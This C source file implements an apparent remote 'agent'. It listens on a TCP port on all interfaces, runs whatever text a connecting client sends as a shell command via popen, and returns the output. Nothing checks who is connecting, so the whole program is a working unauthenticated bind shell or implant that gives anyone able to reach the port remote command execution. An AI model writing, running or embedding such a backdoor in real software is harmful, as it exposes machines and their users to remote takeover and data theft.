#include "../../include/agent/agent.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc,const char* argv[]) {

    if (argc < 2) {
        printf("Usage: %s <port>\n", argv[0]);
        return 1;
    }

    uint16_t port = atoi(argv[1]);

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        printf("Error creating socket\n");
        return 1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0) {
        perror("Error setting socket options");
        return 1;
    }

    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        printf("Error binding socket\n");
        return 1;
    }


    printf("[Agent] : Bound on port %hu\n", port);

    if (listen(server_fd, 10) < 0) {
        printf("Error listening on socket\n");
        return 1;
    }

    printf("[Agent] : Listening on port %hu\n", port);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_addr_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_addr_len);
        if (client_fd < 0) {
            printf("Error accepting connection\n");
            close(server_fd);
            return 1;
        }

        char command[MAX_BUFFER_SIZE];
        memset(command, 0, MAX_BUFFER_SIZE);

        int n = read(client_fd, command, MAX_BUFFER_SIZE);
        if (n <= 0) {
            printf("Error reading from socket\n");
            close(server_fd);
            close(client_fd);
            return 1;
        }

        printf("[Agent] : Received command '%s'\n", command);


        // Exec command rcved by network, and grab output with popen

        FILE* fp = popen(command, "r");
        if (fp == NULL) {
            printf("Error executing command\n");
            close(client_fd);
            return 1;
        }

        char cmd_output[MAX_BUFFER_SIZE];
        memset(cmd_output, 0, MAX_BUFFER_SIZE);

        while (fgets(cmd_output, MAX_BUFFER_SIZE, fp) != NULL) {
            write(client_fd, cmd_output, strlen(cmd_output));
            memset(cmd_output, 0, MAX_BUFFER_SIZE);
        }

        pclose(fp);
        
        printf("[Agent] : Command output sent\n");

        close(client_fd);
    }

    close(server_fd);
    return 0;
}